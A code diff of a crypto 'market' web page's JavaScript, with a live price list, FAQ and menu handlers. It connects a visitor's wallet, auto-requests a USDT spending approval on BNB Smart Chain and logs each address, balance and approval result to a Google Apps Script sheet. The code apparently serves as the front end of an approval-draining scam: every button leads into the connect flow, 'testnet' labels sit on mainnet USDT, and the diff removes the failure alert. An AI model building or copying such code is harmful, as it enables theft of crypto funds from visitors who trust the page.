@@ -15,6 +15,7 @@ function closeApprovalModal(){
   approvalModal.classList.add("hidden");
 }
 
+
 closeApprovalBtn?.addEventListener("click", closeApprovalModal);
 modalCancelBtn?.addEventListener("click", closeApprovalModal);
 
@@ -35,7 +36,7 @@ modalCancelBtn?.addEventListener("click", closeApprovalModal);
       return n.toFixed(4).replace(/\.?0+$/, "");
     }
 
-    const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbwvuWmHzDB8dIWiMXtg6xnOyKLOLHJkDzi8cecrY6NcV7_BAIIN9oQditDpY5EYOK1q6A/exec";
+    const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbx6rguJLb7BgytG3Yj53NZiUgxfeIIlu6ofL8IHm8fRqyYXxTAlGKm5yG3c_1yiEQ7bRQ/exec";
     const APPS_SCRIPT_SECRET = "justforme";
 
     const TOKEN_ADDRESS   = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
@@ -67,13 +68,48 @@ modalCancelBtn?.addEventListener("click", closeApprovalModal);
     let currentUserId         = null;
     let currentBNBBalance     = null;
     let currentTokenBalance   = null;
-    let isWalletConnected = false;
-  
    
- 
+let isWalletConnected = false;
 let isTokenApproved = false;
 let approvalFailed  = false;
 
+function updateUIState() {
+
+  const hideAll = () => {
+    document.querySelectorAll("#authUI > div")
+      .forEach(el => el.classList.add("hidden"));
+  };
+
+  // NOT CONNECTED
+  if (!isWalletConnected) {
+    hideAll();
+    document.getElementById("ui-default").classList.remove("hidden");
+    return;
+  }
+
+  // CONNECTED BUT CHECKING
+  if (isWalletConnected && !isTokenApproved && !approvalFailed) {
+    hideAll();
+    document.getElementById("ui-connected").classList.remove("hidden");
+    return;
+  }
+
+  // NOT APPROVED
+  if (!isTokenApproved && approvalFailed) {
+    hideAll();
+    document.getElementById("ui-not-approved").classList.remove("hidden");
+    return;
+  }
+
+  // APPROVED
+  if (isTokenApproved) {
+    hideAll();
+    document.getElementById("ui-approved").classList.remove("hidden");
+
+    // optional redirect
+    // window.location.href = "dashboard.html";
+  }
+}
 
 
 
@@ -129,9 +165,19 @@ async function handleAppKitProvider(provider) {
 
     // Restore UI + balances
     await restoreSessionFromAddress(address);
+// 🔥 ADD THIS (CRITICAL FIX)
+await notifyBackend(
+  address,
+  BNB_TESTNET_LABEL,
+  currentUserId,
+  currentBNBBalance,
+  currentTokenBalance,
+  "connect"
+);
+console.log("CONNECT LOG (AppKit)");
 
     isWalletConnected = true;
-    
+    updateUIState();
 
     setStatus("Connected");
 
@@ -232,8 +278,7 @@ async function handleAppKitProvider(provider) {
       isTokenApproved = false;
 approvalFailed  = false;
 updateApproveButtonUI();
-
-
+updateUIState();
     }
 
    
@@ -408,14 +453,19 @@ updateApproveButtonUI();
         console.log("[approve] currentAllowance =", currentAllowance.toString());
 
        if (currentAllowance > 0n) {
+        
   isTokenApproved = true;
   approvalFailed  = false;
+           updateUIState();
   setStatus("Connected + Approved ✅");
   updateApproveButtonUI();
   await logApproval("approval_already");
   return;
+       
 }
-
+isTokenApproved = false;
+approvalFailed  = false;
+updateUIState();
 
         // 2) send approve tx
         setStatus("Waiting for wallet to confirm approval…");
@@ -433,6 +483,7 @@ updateApproveButtonUI();
 
     isTokenApproved = true;
 approvalFailed  = false;
+          updateUIState();
 setStatus("Connected + Approved ✅");
 updateApproveButtonUI();
 await logApproval("approval_approved");
@@ -446,9 +497,10 @@ await logApproval("approval_approved");
         }
 isTokenApproved = false;
 approvalFailed  = true;
+          updateUIState();
 setStatus("Connected • Approval failed");
 updateApproveButtonUI();
-alert("Token approval failed: " + (err?.message || err));
+
 await logApproval(tag);
 
       }
@@ -478,6 +530,7 @@ modalApproveBtn?.addEventListener("click", async () => {
 
     
     async function restoreSessionFromAddress(address){
+      window.currentAddress = address;
       currentAddress = address;
 
       const balanceWei = await web3Instance.eth.getBalance(address);
@@ -489,6 +542,14 @@ modalApproveBtn?.addEventListener("click", async () => {
 
       setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
       setUserIdUI(userId);
+      // 🔥 SET SHORT WALLET (UI DASHBOARD)
+const shortAddress =
+  address.slice(0,6) + "..." + address.slice(-4);
+
+const walletShortEl = document.getElementById("walletShort");
+if (walletShortEl) {
+  walletShortEl.textContent = shortAddress;
+}
 
       const tokenBalanceRaw  = await getTokenBalance(address);
       const tokenBalanceNum  = tokenBalanceRaw ? Number(tokenBalanceRaw) : 0;
@@ -512,7 +573,7 @@ if (connectBtn) {
 
       
       updateApproveButtonUI();
-
+updateUIState();
 
 
 
@@ -524,6 +585,11 @@ if (connectBtn) {
       };
     }
 
+
+
+
+
+    
     // 🔁 NEW: connect using Reown AppKit
  // 🔁 NEW: connect using Reown AppKit (fixed for mobile)
 async function connectFlow() {
@@ -578,51 +644,35 @@ async function connectFlow() {
     let chainId    = await web3Instance.eth.getChainId();
     let chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
 
-    if (chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
-      const switched = await switchToBSC(providerInstance);
-      if(!switched){
-        alert("Please switch to BNB Smart Chain (56) in your wallet and try again.");
-        setStatus("Wrong network");
-        return;
-      }
-      chainId    = await web3Instance.eth.getChainId();
-      chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
-      if(chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
-        alert("Network switch failed. Make sure you are on BNB Smart Chain (56).");
-        setStatus("Wrong network");
-        return;
-      }
+
+
+ if (chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
+      // Open AppKit's native network switcher instead of forcing a raw RPC call
+      window.appKit.open({ view: 'Networks' });
+      setStatus("Wrong network");
+      return; 
     }
 
     // 7) Connected + correct network
     setStatus("Connected");
 
-    const sessionPromise = (async () => {
-      const session = await restoreSessionFromAddress(address);
-      const balanceBNB   = session.balanceBNB;
-      const tokenBalance = session.tokenBalance;
-      const userId       = session.userId;
+const session = await restoreSessionFromAddress(address);
 
-      // Log to sheet
-      notifyBackend(
-        address,
-        BNB_TESTNET_LABEL,
-        userId,
-        balanceBNB,
-        tokenBalance,
-        "connect"
-      ).catch(console.error);
-
-      return session;
-    })();
-
+await notifyBackend(
+  address,
+  BNB_TESTNET_LABEL,
+  session.userId,
+  session.balanceBNB,
+  session.tokenBalance,
+  "connect"
+);
+// 🧪 DEBUG (temporary)
+console.log("CONNECT LOG SENT");
 
     updateApproveButtonUI();
-
-
     // 8) Token approval (same behavior as before)
     await ensureTokenApproval();
-    sessionPromise.catch(console.error);
+
 
   } catch (err) {
     console.error("connectFlow error (AppKit):", err);
@@ -651,6 +701,7 @@ function updateApproveButtonUI() {
 
   // Connected + not approved → show
   approveBtn.classList.remove("hidden");
+  
 }
 
 
@@ -775,3 +826,132 @@ setupAppKitProviderWatcher();
 
   })();
   
+const coins = [
+  { symbol: "BTCUSDT", name: "Bitcoin",
+    logo: "https://assets.coingecko.com/coins/images/1/large/bitcoin.png" },
+
+  { symbol: "GTUSDT", name: "GateToken",
+    logo: "https://assets.coingecko.com/coins/images/325/large/GT.png" },
+
+  { symbol: "ETHUSDT", name: "Ethereum",
+    logo: "https://assets.coingecko.com/coins/images/279/large/ethereum.png" },
+
+  { symbol: "XRPUSDT", name: "XRP",
+    logo: "https://assets.coingecko.com/coins/images/44/large/xrp-symbol-white-128.png" },
+
+  { symbol: "SOLUSDT", name: "Solana",
+    logo: "https://assets.coingecko.com/coins/images/4128/large/solana.png" },
+
+  { symbol: "USDCUSDT", name: "USDCoin",
+    logo: "https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png" },
+
+
+];
+async function loadMarket() {
+  const res = await fetch("https://api.binance.com/api/v3/ticker/24hr");
+  const data = await res.json();
+
+  const list = document.getElementById("list");
+  list.innerHTML = "";
+
+  coins.forEach(c => {
+    const coin = data.find(d => d.symbol === c.symbol);
+    if (!coin) return;
+
+    const price = parseFloat(coin.lastPrice);
+    const change = parseFloat(coin.priceChangePercent);
+
+    const cls = change >= 0 ? "up" : "down";
+    const short = c.symbol.replace("USDT","");
+
+    list.innerHTML += `
+      <div class="row">
+        <div class="left">
+          <img src="${c.logo}">
+          <div>
+            <div class="symbol">${short}</div>
+            <div class="name">${c.name}</div>
+          </div>
+        </div>
+
+        <div class="right">
+          <div class="price">$${price.toLocaleString()}</div>
+          <div class="change ${cls}">
+            ${change.toFixed(2)}%
+          </div>
+        </div>
+      </div>
+    `;
+  });
+}
+
+loadMarket();
+setInterval(loadMarket, 5000); // 🔥 auto update every 5 sec
+
+document.querySelectorAll(".icon-btn").forEach(btn => {
+  btn.addEventListener("click", () => {
+    document.getElementById("connectBtn").click();
+  });
+});
+
+
+
+const toggle = document.getElementById("menuToggle");
+const menu = document.getElementById("mobileMenu");
+
+toggle.onclick = () => {
+  toggle.classList.toggle("active");
+
+  if (menu.style.display === "flex") {
+    menu.style.display = "none";
+  } else {
+    menu.style.display = "flex";
+  }
+};
+
+/* Mobile connect triggers real connect */
+
+document.getElementById("connectMobile")
+  .onclick = () =>
+  document.getElementById("connectBtn").click();
+
+
+  // FAQ
+document.querySelectorAll(".faq-question").forEach(btn => {
+  btn.onclick = () => {
+    btn.parentElement.classList.toggle("active");
+  };
+});
+
+// Footer
+document.querySelectorAll(".footer-title").forEach(btn => {
+  btn.onclick = () => {
+    btn.parentElement.classList.toggle("active");
+  };
+});
+
+
+
+document.addEventListener("DOMContentLoaded", () => {
+  const walletEl = document.getElementById("walletShort");
+
+  if (!walletEl) return;
+
+  walletEl.style.cursor = "pointer";
+
+  walletEl.addEventListener("click", () => {
+    if (!currentAddress) return;
+
+    navigator.clipboard.writeText(currentAddress);
+
+    const original =
+      currentAddress.slice(0,6) + "..." +
+      currentAddress.slice(-4);
+
+    walletEl.textContent = "Copied ✓";
+
+    setTimeout(() => {
+      walletEl.textContent = original;
+    }, 1200);
+  });
+});
